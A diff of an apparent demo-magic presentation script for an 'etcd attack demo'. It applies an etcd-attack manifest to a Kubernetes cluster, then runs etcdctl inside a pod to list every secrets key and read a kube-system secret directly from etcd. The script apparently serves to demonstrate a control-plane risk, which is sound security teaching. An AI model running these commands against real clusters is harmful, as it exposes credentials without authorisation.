@@ -37,11 +37,9 @@ clear
 #pe "cd stuff"
 
 p "etcd attack demo"
-pe "kubectl apply -f etcd-attack/"
-p "This pod is directly scheduled on a control plane node"
-p "let's take a look"
 pe "vim etcd-attack/etcdclient.yaml"
-
+pe "kubectl apply -f etcd-attack/"
+pe "kubectl exec etcdclient -- etcdctl member list"
 pe "kubectl exec etcdclient -- etcdctl get '' --keys-only --from-key | grep secrets"
 pe "kubectl exec etcdclient -- etcdctl get /registry/secrets/kube-system/${SECRET}"
 unset TYPE_SPEED
